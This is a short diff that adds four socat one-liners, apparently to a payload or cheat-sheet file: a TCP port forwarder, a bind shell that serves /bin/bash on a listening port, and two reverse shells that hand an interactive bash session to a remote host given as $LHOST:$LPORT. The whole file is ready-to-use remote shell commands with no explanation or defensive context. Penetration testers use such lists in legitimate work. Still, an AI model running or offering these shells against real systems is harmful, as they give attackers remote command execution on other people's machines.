@@ -1,0 +1,4 @@
+socat TCP4-LISTEN:"$LPORT",fork TCP4:"$TARGET":"$RPORT"
+socat TCP-LISTEN:"$LPORT",fork EXEC:/bin/bash
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:"$LHOST":"$LPORT"
+socat TCP:"$LHOST":"$LPORT" EXEC:'bash -li',pty,stderr,setsid,sigint,sane
